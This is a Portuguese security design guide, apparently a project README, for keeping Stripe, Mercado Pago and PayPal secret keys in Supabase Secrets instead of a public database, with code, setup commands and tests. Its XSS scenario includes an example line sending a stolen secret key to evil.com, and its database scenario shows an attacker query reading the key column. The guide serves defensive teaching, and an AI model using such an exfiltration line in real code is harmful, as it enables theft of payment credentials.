# 🔐 Cofre Invisível: Estratégia de Segurança Máxima para API Keys

## 📋 Resumo Executivo

**Cofre Invisível** é uma estratégia de segurança de máxima que garante que **chaves secretas de API nunca são armazenadas em banco de dados público nem acessíveis via interface web**.

```
┌─────────────────────────────────────────────────────────────────────┐
│ ANTES (❌ INSEGURO)                                                  │
├─────────────────────────────────────────────────────────────────────┤
│ FeeManagement.jsx (Browser)                                         │
│    ↓ Usuário digita: sk_live_abc123xyz                             │
│    ↓ Salva no Banco de Dados (PUBLIC)                              │
│    ↓ Busca via SELECT * | platform_settings                        │
│    ↓ Retorna para Frontend (JavaScript visível)                     │
│    ↓ Pode ser explorado via DevTools, MITM, XSS                    │
│                                                                      │
│ 🚨 CRÍTICO: Chave secreta exposição máxima                         │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│ DEPOIS (✅ SEGURO - COFRE INVISÍVEL)                               │
├─────────────────────────────────────────────────────────────────────┤
│ Supabase Secrets (Servidor)                                         │
│    ↓ npx supabase secrets set STRIPE_SECRET_KEY=sk_live_...        │
│    ↓ Armazenado APENAS em ambiente Supabase (não em banco)        │
│    ↓ Acessível APENAS de Edge Functions                            │
│    ↓ Injeta como Deno.env.STRIPE_SECRET_KEY                        │
│                                                                      │
│ Frontend (Browser)                                                  │
│    ↓ Busca APENAS: VITE_STRIPE_PUBLISHABLE_KEY (PÚBLICA)          │
│    ↓ Armazenado em .env.local                                      │
│    ↓ Seguro: chave pública é para "contar mas não gastar"         │
│                                                                      │
│ 🔒 SEGURO: Chave secreta NUNCA sai de Edge Functions              │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 🏗️ Arquitetura de Segurança

### Camadas de Chaves

#### 1️⃣ **Chaves Públicas (Frontend - .env.local)**
Seguras para exposição no JavaScript do cliente:

```env
VITE_STRIPE_PUBLISHABLE_KEY=pk_test_abc123...
VITE_MP_PUBLIC_KEY=APP_USR-1234...
VITE_PAYPAL_CLIENT_ID=AcYj1234...
```

**Por que são seguras:**
- Stripe: "Publishable Key" é para cliente conhecer, não gastar
- Mercado Pago: Public Key é só para Checkout embarcado
- PayPal: Client ID identifica a app, não autoriza ações

**Risco:** Muito baixo - esses valores se veem em HTML público da Stripe

---

#### 2️⃣ **Chaves Secretas (Supabase Secrets - Servidor)**
Inacessíveis ao cliente, apenas Edge Functions:

```bash
# Configurar via CLI
npx supabase secrets set STRIPE_SECRET_KEY=sk_live_abc123...
npx supabase secrets set STRIPE_WEBHOOK_SECRET=whsec_abc123...
npx supabase secrets set MP_ACCESS_TOKEN=APP_USR-...
npx supabase secrets set PAYPAL_CLIENT_SECRET=AcYj1234...
```

**Por que são seguras:**
- Armazenadas em Supabase vault (encrypted at rest)
- Nunca trafegam via HTTP
- Ambiente isolado das Edge Functions
- Sem acesso do cliente JavaScript

**Risco:** Minimizado - acesso restrito a backend

---

### Fluxo de Requisições

```
┌─────────┐
│ Cliente │ (browser com PUBLISHABLE_KEY)
└────┬────┘
     │
     │ POST /checkout (sem chave secreta)
     │ body: { amount, item_id }
     ↓
┌──────────────────────────────┐
│ Edge Function                │
│ stripe-create-payment-intent │
├──────────────────────────────┤
│ 1. Valida JWT                │
│ 2. Busca amount do DB        │
│ 3. getSecret(STRIPE_SECRET)  │ ← Deno.env
│ 4. stripe.paymentIntents...  │
│ 5. Retorna client_secret     │
└──────────────────────────────┘
     ↓
     │ { client_secret: "pi_abc..." }
     │
┌─────────┐
│ Cliente │ confirma com Stripe.js
└─────────┘
```

**Características:**
- Cliente NUNCA vê secretKey
- Edge Function NUNCA expõe secretKey
- Banco de dados NUNCA armazena secretKey
- Stripe webhook valida via signature (não via key no DB)

---

## 🔧 Implementação Técnica

### Frontend (React/Vite)

#### ❌ ANTES - Inseguro
```javascript
// ❌ NUNCA FAZER ISTO
const config = await supabase
  .from('platform_settings')
  .select('stripe_secret_key_production') // 🚨 SECRET no banco!
  .single();

stripe = await loadStripe(config.stripe_secret_key_production); // 🚨 Secret no frontend!
```

#### ✅ DEPOIS - Cofre Invisível
```javascript
// ✅ CORRETO
const publishableKey = import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY; // De .env.local
const stripe = await loadStripe(publishableKey); // Chave PÚBLICA

// Chamar Edge Function que usa STRIPE_SECRET_KEY (não enviamos)
const response = await supabase.functions.invoke('stripe-create-payment-intent', {
  body: { amount, metadata } // ⚠️ NÃO enviamos secretKey
});
```

### Backend (Edge Function)

#### ✅ Stripe Payment Intent
```typescript
// supabase/functions/stripe-create-payment-intent/index.ts

import Stripe from 'https://esm.sh/stripe@14.0.0';

const stripeSecretKey = Deno.env.get('STRIPE_SECRET_KEY'); // ← De Supabase Secrets
if (!stripeSecretKey) {
  throw new Error('STRIPE_SECRET_KEY não configurada');
}

const stripe = new Stripe(stripeSecretKey);

export const handler = async (req: Request) => {
  const { amount, metadata } = await req.json();
  
  // ⚠️ NÁS buscamos do banco, nunca confiamos no cliente
  const transaction = await supabase
    .from('transactions')
    .select('price, platform_fee')
    .eq('id', metadata.transaction_id)
    .single();
  
  const finalAmount = (transaction.price + transaction.platform_fee) * 100;
  
  // Criar Payment Intent COM a chave secreta
  const paymentIntent = await stripe.paymentIntents.create({
    amount: finalAmount,
    currency: 'brl',
    metadata
  });
  
  // Retorna APENAS client_secret (não o secret_key)
  return { clientSecret: paymentIntent.client_secret };
};
```

#### ✅ Stripe Webhook Handler
```typescript
// supabase/functions/stripe-webhook/index.ts

const webhookSecret = Deno.env.get('STRIPE_WEBHOOK_SECRET');
const stripe = new Stripe(Deno.env.get('STRIPE_SECRET_KEY'));

export const handler = async (req: Request) => {
  const payload = await req.text();
  const signature = req.headers.get('stripe-signature');

  let event;
  try {
    // ✅ Valida assinatura do webhook com secreto
    event = stripe.webhooks.constructEvent(payload, signature, webhookSecret);
  } catch (err) {
    return new Response('Webhook signature invalid', { status: 400 });
  }

  // Processar evento de forma segura
  if (event.type === 'payment_intent.succeeded') {
    await updateTransactionStatus(event.data.object.id, 'pago');
  }

  return new Response(JSON.stringify({ received: true }), { status: 200 });
};
```

---

## 🛠️ Instruções de Configuração

### Passo 1: Configurar Variáveis de Ambiente do Frontend

Criar / atualizar `.env.local`:

```env
# .env.local - GIT IGNORE ⚠️

# Chaves Públicas (Seguras para Browser)
VITE_STRIPE_PUBLISHABLE_KEY=pk_test_51SyXQsKvlviSN9hTIZrA0B2...
VITE_MP_PUBLIC_KEY=APP_USR-12345-integration-test...
VITE_PAYPAL_CLIENT_ID=AcYjA1234567890...

# URL do Backend localizado
VITE_API_URL=http://localhost:3000
```

**Onde obter:**
- **Stripe**: Dashboard → Developers → API Keys → Publishable Key
- **Mercado Pago**: Settings → API Keys → Public Key
- **PayPal**: Developer → Sandbox → App Credentials → Client ID

---

### Passo 2: Configurar Supabase Secrets

```bash
# 1. Fazer login (se não estiver)
npx supabase login

# 2. Vincular ao projeto
npx supabase link --project-ref SEU_PROJECT_REF

# 3. Configurar chaves secretas (uma por uma)
npx supabase secrets set STRIPE_SECRET_KEY=sk_live_abc123...
npx supabase secrets set STRIPE_WEBHOOK_SECRET=whsec_abc123...
npx supabase secrets set MP_ACCESS_TOKEN=APP_USR-xyz789...
npx supabase secrets set PAYPAL_CLIENT_SECRET=xyz789...

# 4. Verificar que foram configuradas
npx supabase secrets list
```

**Onde obter:**
- **Stripe Secret**: Dashboard → Developers → API Keys → Secret Key
- **Stripe Webhook**: Dashboard → Developers → Webhooks → Signing Secret
- **MercadoPago**: Settings → API Keys → Access Token
- **PayPal**: Developer → Sandbox → App Credentials → Secret

---

### Passo 3: Validar Configuração

#### Verificar Variáveis Públicas
```bash
# Deve retornar os valores
echo $VITE_STRIPE_PUBLISHABLE_KEY
```

#### Verificar Secrets no Supabase
```bash
# Deve listar as chaves configuradas (sem valores)
npx supabase secrets list
```

#### Testar Edge Function
```bash
npm run build  # Compilar frontend
npm run dev    # Rodar frontend + Supabase local

# Abrir DevTools → Network → Verificar requisição para stripe-create-payment-intent
# Não deve haver "secret_key" no request
```

---

## 🔒 Checklist de Segurança

- [ ] **Remover completamente campos de input para chaves do admin UI**
  - ❌ Não tem campo para "Stripe Secret Key" no FeeManagement
  - ❌ Não tem campo para "MercadoPago Access Token" no FeeManagement

- [ ] **Verificar banco de dados não armazena chaves secretas**
  ```sql
  -- Deve retornar NULL ou não ter a coluna
  SELECT stripe_secret_key_production FROM platform_settings LIMIT 1;
  -- ✅ column "stripe_secret_key_production" does not exist
  ```

- [ ] **Confirmar Edge Functions buscam de Deno.env**
  ```bash
  grep -r "Deno.env.get" supabase/functions/
  # ✅ Deve encontrar: STRIPE_SECRET_KEY, STRIPE_WEBHOOK_SECRET, etc
  ```

- [ ] **Validar frontend NUNCA envia chaves secretas**
  ```bash
  grep -r "stripe_secret_key\|secret_key\|secretKey" src/
  # ❌ Não deve encontrar nada relacionado a *_secret
  ```

- [ ] **Testar webhook signature validation**
  - Configurar webhook em Stripe → Test Event
  - Verificar logs de `webhook_logs` na tabela
  - Confirmar que `stripe.webhooks.constructEvent()` valida

- [ ] **Revisar RLS de tabelas sensíveis**
  ```sql
  -- Ninguém pode ler chaves (porque não existem mais no DB!)
  SELECT * FROM information_schema.role_table_grants 
  WHERE table_name = 'platform_settings' AND privilege_type = 'SELECT';
  ```

---

## 📊 Comparação: Antes vs Depois

| Aspecto | ❌ ANTES | ✅ DEPOIS |
|---------|---------|----------|
| **Armazenamento das chaves** | Banco de dados público (RLS fraco) | Supabase Secrets (vault) |
| **Acesso via Browser** | Sim (via SELECT) | Não |
| **Visível em DevTools** | Sim | Não |
| **Editável via Admin UI** | Sim (risco) | Não |
| **Injetado em Edge Function** | Manualmente by code | Deno.env |
| **Risco de SQL Injection** | Alto (query com *) | Médio (campos específicos) |
| **Risco de XSS** | Crítico (chave no JS) | Baixo (apenas publishableKey) |
| **Rotação de chaves** | Difícil (resetar admin) | Fácil (CLI) |

---

## 🚨 Cenários de Segurança

### Cenário 1: Hacker acessa banco de dados

**ANTES:**
```sql
-- Hacker executa
SELECT stripe_secret_key_production FROM platform_settings;
-- 💥 Obtém: sk_live_abc123...
-- 💥 Pode fazer pagamentos em nome do site
```

**DEPOIS:**
```sql
-- Hacker tenta
SELECT stripe_secret_key_production FROM platform_settings;
-- ✅ column does not exist (coluna foi removida)
-- ✅ Seguro: chave não está em ninguém lugar do BD
```

---

### Cenário 2: XSS em página admin

**ANTES:**
```javascript
// Hacker injeta JS na página
const allSettings = await fetch('/api/settings');
const secretKey = allSettings.stripe_secret_key_production;
// Envia para servidor hacker
fetch('https://evil.com/steal?key=' + secretKey);
// 💥 Chave comprometida
```

**DEPOIS:**
```javascript
// XSS tenta o mesmo
const allSettings = await fetch('/api/settings');
const secretKey = allSettings.stripe_secret_key_production;
// ✅ undefined (campo não existe)
// ✅ Chave não pode ser roubada daqui
```

---

### Cenário 3: MITM (Man in the Middle) em requisição

**ANTES:**
```
Browser → [INTERNET (plaintext)] → Backend
                ↑
          Hacker lê traffic
          Vê: GET /api/settings
          Response: {..., stripe_secret_key: "sk_live_abc..."}
          💥 Chave interceptada
```

**DEPOIS:**
```
Browser → [HTTPS/TLS criptografado] → Edge Function
                ↑
          Hacker vê tráfego criptografado
          Vê apenas: POST /stripe-payment-intent {amount: 100}
          ✅ Sem acesso a chaves (nem o cliente sabe delas)
```

---

## 📝 Roteiros de Teste

### Teste 1: Verificar FeeManagement sem campos de chaves

```bash
# Abrir navegador e acessar /admin/fees
# ✅ Deve mostrar: "🔐 Cofre Invisível"
# ✅ NÃO deve ter campo para "Stripe Secret Key"
# ✅ Deve mostrar apenas: taxa venda, taxa processamento, URL portal
```

### Teste 2: Validar Publishable Key está carregando

```javascript
// DevTools Console
import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY
// ✅ Deve retornar: "pk_test_..." ou "pk_live_..."

// Verificar Stripe.js está inicializado
window.Stripe
// ✅ Deve retornar função
```

### Teste 3: Confirmar secretKey não sai do Edge Function

```bash
# Fazer compra de teste
# DevTools → Network → stripe-create-payment-intent
# ✅ Request body NÃO deve conter "secret_key" ou "sk_"
# ✅ Response body NÃO deve conter "secret_key" ou "sk_"
# ✅ Deve conter apenas: "client_secret" para Stripe.js confirmar
```

### Teste 4: Validar webhook signature

```javascript
// Stripe Dashboard → Webhooks → Send test event
// Supabase Dashboard → SQL Editor
SELECT * FROM webhook_logs WHERE provider = 'stripe' ORDER BY created_at DESC LIMIT 1;
// ✅ Deve estar marcado como processado
// ✅ event_type deve ser 'payment_intent.succeeded'
```

---

## 🆘 Troubleshooting

### Problema: "STRIPE_SECRET_KEY não configurada"

```bash
# Verificar se foi configurada
npx supabase secrets list

# Se não estiver lá:
npx supabase secrets set STRIPE_SECRET_KEY=sk_...

# Redeploy função
npx supabase functions deploy stripe-create-payment-intent
```

---

### Problema: "VITE_STRIPE_PUBLISHABLE_KEY is undefined"

```bash
# Verificar .env.local existe
cat .env.local

# Deve ter:
# VITE_STRIPE_PUBLISHABLE_KEY=pk_test_...

# Restart dev server
npm run dev
```

---

### Problema: "Webhook signature invalid"

```bash
# Verificar secret está correto
npx supabase secrets list | grep STRIPE_WEBHOOK

# Deve ser: whsec_... (não sk_... ou pk_...)

# Se errado:
npx supabase secrets set STRIPE_WEBHOOK_SECRET=whsec_...
npx supabase functions deploy stripe-webhook
```

---

## 📚 Referências

- **Stripe Security**: https://stripe.com/docs/keys
- **Supabase Secrets**: https://supabase.com/docs/guides/functions/secrets
- **OWASP API Security**: https://owasp.org/www-project-api-security/
- **12-Factor App**: https://12factor.net/config

---

## ✅ Conclusão

**Cofre Invisível** elimina os maiores riscos de segurança em plataformas de pagamento:

- ✅ Chaves secretas NUNCA saem do servidor
- ✅ Banco de dados público NUNCA armazena secrets
- ✅ Frontend acessa APENAS chaves públicas
- ✅ Edge Functions validam tudo (JWT, valores, assinaturas)
- ✅ Fácil rotação de chaves via CLI

**Resultado:** Mesmo se hackers acessarem o banco, capturarem JS, ou interceptarem tráfego, **eles não conseguem as chaves secretas** porque elas literalmente não estão em lugar nenhum acessível ao cliente.

🔐 **Seu cofre é invisível.**
